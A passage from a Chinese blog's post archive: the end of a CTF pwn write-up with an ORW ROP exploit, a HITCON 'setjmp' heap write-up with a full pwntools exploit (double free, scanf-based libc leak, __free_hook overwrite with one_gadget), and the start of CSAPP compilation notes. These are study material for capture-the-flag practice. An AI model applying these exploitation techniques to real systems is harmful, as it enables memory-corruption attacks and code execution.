class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import*<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>def cmd(cmd):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;2. stack pivoting\n&#x27;</span>,str(cmd))<br>    <br>def cmd1(size,index,con):<br>    cmd(<span class="hljs-number">1</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;size: &#x27;</span>,str(size))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;index: &#x27;</span>,str(index))<br>    io.send(con)<br>    <br>def leave():<br>    cmd(<span class="hljs-number">2</span>)<br>    <br><br>cmd1(<span class="hljs-number">1</span>,<span class="hljs-number">16</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>leave()<br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">2</span>,<span class="hljs-number">30</span>):<br>    cmd1(<span class="hljs-number">0x20</span>,i*<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x45&#x27;</span>)<br>    data=io.recv(<span class="hljs-number">0x18</span>).strip()<br>    print(<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>,data)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;stack&#x27;</span> not in data:<br>        data1=data[:<span class="hljs-number">16</span>]<br>        start=u64(data1[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>        glibc=u64(data1[<span class="hljs-number">-8</span>:])<br>        <span class="hljs-built_in">stack</span>=u64(data[<span class="hljs-number">-8</span>:])&amp; ~<span class="hljs-number">0xff</span><br>        print(<span class="hljs-string">&#x27;stack:&#x27;</span>,hex(<span class="hljs-built_in">stack</span>))<br>        print(<span class="hljs-string">&#x27;glibc&#x27;</span>,hex(glibc))<br>        print(<span class="hljs-string">&#x27;start:&#x27;</span>,hex(start))<br>        libc_base=glibc-(<span class="hljs-number">0x7f24e43751ca</span><span class="hljs-number">-0x7f24e434b000</span>)<br>        start=start<span class="hljs-number">-0x144f</span><br>        <br>        bss=start+<span class="hljs-number">0x4200</span><br>        <span class="hljs-meta"># gdb.attach(io)</span><br>        io.recv()<br>        rdi=libc_base+<span class="hljs-number">0x000000000010f75b</span><br>        rsi=libc_base+<span class="hljs-number">0x0000000000110a4d</span><br>        rax=libc_base+<span class="hljs-number">0x00000000000dd237</span><br>        syscall=libc_base+<span class="hljs-number">0x0000000000012725b</span><br>        io.sendline(b<span class="hljs-string">&#x27;20&#x27;</span>)<br>        io.sendlineafter(b<span class="hljs-string">&#x27;index: &#x27;</span>,b<span class="hljs-string">&#x27;8&#x27;</span>)<br>        <span class="hljs-meta"># gdb.attach(io)</span><br>        io.send(b<span class="hljs-number">&#x27;f</span>lag<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;*4)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        payload=p64(rdi)+p64(stack-0x8)+p64(rsi)+p64(0)+p64(rax)+p64(0x2)+p64(syscall)#open</span><br><span class="hljs-string">        payload+=p64(rdi)+p64(0x3)+p64(rsi)+p64(bss)+p64(rax)+p64(0)+p64(syscall)#read</span><br><span class="hljs-string">        payload+=p64(rdi)+p64(1)+p64(rsi)+p64(bss)+p64(rax)+p64(0x1)+p64(syscall)#write</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        cmd1(len(payload),8*i,payload)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        io.interactive()</span><br><span class="hljs-string">        </span><br><span class="hljs-string"></span><br><span class="hljs-string">io.interactive()</span><br></code></pre></td></tr></table></figure><p>我本来把b’flag’的字符放在rbp上的，但是不知道为什么，会被覆盖，但是放在rbp-8处就不会被覆盖</p><p>让后还有一个问题，我使用syscall后不会跳回来（使用<code>ROPgadget --binary pwn --only &#39;syscall&#39;</code>​找到的syscall就不会返回，</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607143507-38g6br7.png" alt="image"></p><p>没办法，我直接进libc.so.6里面找的可以返回的syscall</p><p>太不容易了，终于调出来了(这个环境总把我写的东西覆盖掉qwq)</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607131017-7l4hgn6.png" alt="image"></p>]]></content>
    
    
    <categories>
      
      <category>刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>2025京麒</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HITCON CTF —— setjmp</title>
    <link href="/post/hitcon-ctf------setjmp-xgw6m.html"/>
    <url>/post/hitcon-ctf------setjmp-xgw6m.html</url>
    
    <content type="html"><![CDATA[<h1 id="HITCON-CTF-——-setjmp"><a href="#HITCON-CTF-——-setjmp" class="headerlink" title="HITCON CTF —— setjmp"></a>HITCON CTF —— setjmp</h1><p>题目下载：<a href="https://ctf2024.hitcon.org/dashboard/">https://ctf2024.hitcon.org/dashboard/</a></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>之前没遇见过setjmp函数，看的这<a href="https://zhuanlan.zhihu.com/p/82492121">setjmp</a>了解了一下</p><p>现在来分析一下程序</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510214124-a2ae9sm.png" alt="image"></p><p>看一下这个菜单，相较于一般的菜单堆题，多了一个restart，其余的就是一般题目中都有的创建，删除，修改和查看</p><h3 id="restart"><a href="#restart" class="headerlink" title="restart"></a>restart</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510214532-ylwar9n.png" alt="image"></p><p>可以看到，重启这个功能就是跳回到程序开始的地方，就是直接跳回去，没有对我们创建过的东西进行任何修改</p><p>并且，他会重新创建一个root用户</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510214835-hku1hwe.png" alt="image"></p><p>我们不能够控制自己分配chunk的大小，每个用户只有0x20大小的空间</p><p>然后下面写地址的地方看起来感觉有点乱，在gdb里面看一下，其实就是把每个用户之间的地址用双链的结构</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510220053-hq8ukfb.png" alt="image"></p><h3 id="del"><a href="#del" class="headerlink" title="del"></a>del</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510220313-ro9e8hl.png" alt="image"></p><p>free之后没有置零</p><h3 id="change"><a href="#change" class="headerlink" title="change"></a>change</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511173848-qj3q0v7.png" alt="image">​</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511202557-c9j2ukn.png" alt="image"></p><h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511174226-idgcfyj.png" alt="image">​</p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这是2.31版本的glibc(给了dockerfile文件，从里面的哈希值得出的），hook钩子还存在，tcache有简单的检查double free的机制，还没有混淆，可以使用tcache poisoning</p><p>大致思路就是泄露出libc，使用tcache poisoning申请到free_hook处写入one_gadget或则system。</p><p>但是这道题限制了申请只能为0x20,在fastbin里面，我们泄露不了libc，我目前的想法是修改一个chunk的size位，然后再进行free（不知道还有没有其他办法，如果有，希望师傅们可以在留言里告诉我一下）</p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><h4 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h4><p>我们之前就看到了del里面有一个uaf漏洞，当我们把里面唯一的一个用户删除时，他的双链是指向自己的</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511211500-sb9xg79.png" alt="image"></p><p>这时候我们就可以绕过他双链自己的检测，使用到他的uaf漏洞修改他的bk处的值，绕过2.31的tcache上的double free机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">dele(b<span class="hljs-string">&#x27;root&#x27;</span>)   <br>change(b<span class="hljs-string">&#x27;\x00&#x27;</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)<br>dele(b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511212032-dr0ayj7.png" alt="image"></p><h4 id="尝试（失败了）"><a href="#尝试（失败了）" class="headerlink" title="尝试（失败了）"></a>尝试（失败了）</h4><p>我开始的思路是通过double free取申请一个chunk上面一点的位置，使之刚好可以修改这个chunk的size位，然后修改size位unsorted bin大小，free掉这个chunk后，就会泄露出一个值取计算libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">dele(<span class="hljs-string">b&#x27;root&#x27;</span>)   <br>show()<br>io.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>data = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;data:&#x27;</span>,<span class="hljs-built_in">hex</span>(data))<br>res()<br>add(<span class="hljs-string">b&#x27;aaaa&#x27;</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;root&#x27;</span>) <br>change(p64(data+<span class="hljs-number">0x556253a616e0</span>-<span class="hljs-number">0x556253a61010</span>)[:<span class="hljs-number">6</span>],<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)<br>dele(p64(data+<span class="hljs-number">0x556253a616e0</span>-<span class="hljs-number">0x556253a61010</span>)[:<span class="hljs-number">6</span>])<br><br>add(p64(data+<span class="hljs-number">0x556253a616d0</span>-<span class="hljs-number">0x556253a61010</span>)[:<span class="hljs-number">6</span>],p64(data)[:<span class="hljs-number">6</span>])<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;aa&#x27;</span>,p64(<span class="hljs-number">0x540</span>))<br>dele(p64(data+<span class="hljs-number">0x000055882c11c370</span>-<span class="hljs-number">0x55882c11c010</span>)[:<span class="hljs-number">6</span>])<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512084659-h9me6aj.png" alt="image"></p><p>本来我感觉所有的都调好了，高高兴兴去free这个chunk，然后被这个程序自己的双链检测机制给拦住了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512084919-fdv3ig0.png" alt="image"></p><p>从这看出，程序的双链没有指向的我想free掉的chunk</p><p>然后我就去看了这道题目的wp，发现泄露libc用到的竟然是scanf</p><h4 id="利用scanf泄露libc"><a href="#利用scanf泄露libc" class="headerlink" title="利用scanf泄露libc"></a>利用scanf泄露libc</h4><p>参考文章 <a href="https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html" title="Permalink to Heap exploitation, glibc internals and nifty tricks.">Heap exploitation, glibc internals and nifty tricks.</a></p><p>scanf在我们进行输入的时候会开辟一个缓存空间在堆上，然后在函数返回的时候会将这个堆释放。但是我们如果直接使用scanf在本题里面输入很长的内容使之生成了一个大的unsorted bin，但在scanf函数返回后，unsorted bin也会因为与top chunk相邻而合并，这时候就需要使用到malloc_consolidate这个函数（很早之前就看过这个函数了，还是第一次用）当我们申请了很多个fast bin大小的chunk然后再free掉之后，调用malloc_consolidate这个函数就可以使这些fast bin大小的chunk合并为一个unsorted bin的chunk</p><p>（关于malloc_consolidate的调用时机可以看看这<a href="https://bbs.kanxue.com/thread-257742.htm#msg_header_h2_2">https://bbs.kanxue.com/thread-257742.htm#msg_header_h2_2</a>）</p><p>创建许多个用户再删除，让堆空间存在很多个fast bin chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    add(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(i))<br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    dele(<span class="hljs-built_in">str</span>(i))<br></code></pre></td></tr></table></figure><p>然后我们使用scanf输入很多数据，使之生成一个large bin从而触发malloc_consolidate合并之前的fast bin</p><p>但是这一步有两个需要关注的点：</p><p>1.我们需要调用一下重启功能，让程序自己在我们的fast bin下面创建两个0xd1的chunk隔绝top chunk</p><p>2.由于我们scanf的函数读取的是int类型</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512141615-wafkwiw.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512141733-zovaxe1.png" alt="image"></p><p>所以我们输入的数据只能用0填充，因为0*0x540还是0，但是使用其他数据就不包含在条件里会执行exit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">res()<br>choose(<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x500</span>)<br></code></pre></td></tr></table></figure><p>这样，就出现了unsorted bin</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512142058-eor4r7z.png" alt="image"></p><p>之后再将之前的tcache bin全部申请出来，只剩下unsorted bin的时候，申请一个用户名和密码都为空的用户，就不会覆盖需要leak的数据（最低位会被换行符覆盖，但是没什么影响），show一下就出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(i))<br>     <br>add(<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>show()<br>io.recv()<br>data1=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data1&quot;</span>,<span class="hljs-built_in">hex</span>(data1))<br>offset=<span class="hljs-number">0x7f1a7754a000</span>-<span class="hljs-number">0x7f1a77735b0a</span><br>libc_base=data1+offset<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512142503-0ihu7nx.png" alt="image"></p><p>后面的做法就是使用double free申请到free hook处进行修改就可以了，就不详细分析了</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=process(<span class="hljs-string">&#x27;./run&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./run&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choose</span>(<span class="hljs-params">num</span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,num)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">res</span>():<br>    choose(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name,password</span>):<br>    choose(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,name)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,password)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">name</span>):<br>    choose(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,name)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">name,password</span>):<br>    choose(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    io.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,name)<br>    io.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,password)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    choose(<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><br><br><span class="hljs-comment"># dele(b&#x27;root&#x27;)   </span><br><span class="hljs-comment"># show()</span><br><span class="hljs-comment"># io.recvuntil(b&#x27;: &#x27;)</span><br><span class="hljs-comment"># data = u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-comment"># print(&#x27;data:&#x27;,hex(data))</span><br><span class="hljs-comment"># res()</span><br><span class="hljs-comment"># add(b&#x27;aaaa&#x27;,b&#x27;aaaa&#x27;)</span><br><span class="hljs-comment"># dele(b&#x27;aaaa&#x27;)</span><br><span class="hljs-comment"># dele(b&#x27;root&#x27;) </span><br><span class="hljs-comment"># change(p64(data+0x556253a616e0-0x556253a61010)[:6],b&#x27;\x00&#x27;*8)</span><br><span class="hljs-comment"># dele(p64(data+0x556253a616e0-0x556253a61010)[:6])</span><br><br><span class="hljs-comment"># add(p64(data+0x556253a616d0-0x556253a61010)[:6],p64(data)[:6])</span><br><span class="hljs-comment"># add(b&#x27;a&#x27;,b&#x27;a&#x27;)</span><br><span class="hljs-comment"># add(b&#x27;aa&#x27;,p64(0x540))</span><br><span class="hljs-comment"># dele(p64(data+0x000055882c11c370-0x55882c11c010)[:6])</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    add(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(i))<br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    dele(<span class="hljs-built_in">str</span>(i))<br>    <br>res()<br>choose(<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x500</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(i))<br>     <br>add(<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>show()<br>io.recv()<br>data1=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data1&quot;</span>,<span class="hljs-built_in">hex</span>(data1))<br>offset=<span class="hljs-number">0x7f1a7754a000</span>-<span class="hljs-number">0x7f1a77735b0a</span><br>libc_base=data1+offset<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>onegaddet=libc_base+<span class="hljs-number">0xe6aee</span> <span class="hljs-comment">#0xe6af1 #0xe6af4</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    add(<span class="hljs-string">f&quot;a<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>, <span class="hljs-string">b&quot;aaaa&quot;</span>) <span class="hljs-comment">#把之前的unsorted bin用完</span><br><br>res()<br>dele(<span class="hljs-string">b&#x27;root&#x27;</span>)   <br>show()<br>io.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>data2 = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;data2:&#x27;</span>,<span class="hljs-built_in">hex</span>(data2))<br>res()<br>add(<span class="hljs-string">b&#x27;aaaa&#x27;</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;root&#x27;</span>) <br>change(p64(data2+<span class="hljs-number">0x000055aa5cae8320</span>-<span class="hljs-number">0x55aa5cae7010</span>)[:<span class="hljs-number">6</span>],<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)<br>dele(p64(data2+<span class="hljs-number">0x000055aa5cae8320</span>-<span class="hljs-number">0x55aa5cae7010</span>)[:<span class="hljs-number">6</span>])<br>add(p64(free_hook)[:<span class="hljs-number">6</span>],<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;b&#x27;</span>)<br>add(p64(onegaddet)[:<span class="hljs-number">6</span>],<span class="hljs-string">b&#x27;a&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>gdb.attach(io)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512144737-dcoqw6r.png" alt="image"></p><p>感觉这个题也不算很难，但是我之前没遇见过通过scanf得到unsorted bin的手法，写下来记录一下</p>]]></content>
    
    
    <categories>
      
      <category>刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>HITCON CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第三章：程序的机器级表示</title>
    <link href="/post/csapp-chapter-3-machinelevel-representation-of-programs-z17vqpx.html"/>
    <url>/post/csapp-chapter-3-machinelevel-representation-of-programs-z17vqpx.html</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-第三章：程序的机器级表示"><a href="#CSAPP-第三章：程序的机器级表示" class="headerlink" title="CSAPP 第三章：程序的机器级表示"></a>CSAPP 第三章：程序的机器级表示</h1><p><a href="assets/541118%20%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%8E%9F%E4%B9%A6%E7%AC%AC%E4%B8%89%E7%89%88%EF%BC%89-20250414204331-oqwbxqj.pdf">深入理解计算机系统（原书第三版）.pdf</a></p><p>由于基础知识太差，xia0ji233师傅建议我来看一下CSAPP第三章。这本书看得好艰难！！！感觉自己大概都知道这些知识点，但是一些细节问题又不太了解，表达方式也和我之前学习的时候的表达方式不一样，最后加上这一章竟然有足足的一百一十页，真是看得我要晕字了。</p><h2 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h2><p>这一部分讲的其实就是如何将一个.c文件变成一个可执行的elf文件</p><p>比如，我们现在写了一个最简单的c程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们拥有了一个.c文件，但是.c文件在linux里面不能直接运行</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250414214524-qf66iz0.png" alt="image"></p><p>所以我们需要将他编译为可执行文件（忘记写换行了）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250414214717-2wt6olg.png" alt="image"></p><p>将c文件变为可以执行的elf文件，使用的是以下的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -g hello.c -o hello<br></code></pre></td></tr></table></figure><p>​<code>-g</code>​保留一些调试信息，<code>-o</code>重命名</p><p>在这一条指令背后，包含了四个过程</p><p>1.预处理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -E hello.c -o hello1.i<br></code></pre></td></tr></table></figure><ul><li><ul><li>​ <strong>​<code>#include</code>​</strong> 会将头文件内容插入到源代码中。</li><li>​ <strong>​<code>#define</code>​</strong> 会替换代码中的宏定义。</li><li>还会处理注释的删除、行号标记等。</li></ul></li><li>预处理后，代码变成了一个单纯的、没有宏和头文件包含的标准 C 代码。</li></ul><p>2.编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -S hello1.i -o hello1.s<br></code></pre></td></tr></table></figure><ul><li><p>编译器会进行语法分析、语义分析、优化等工作：</p><ul><li><strong>语法分析</strong>：检查代码是否符合 C 语言的语法规则。</li><li><strong>语义分析</strong>：检查代码的逻辑、变量类型等是否正确。</li><li><strong>生成汇编代码</strong>：将 C 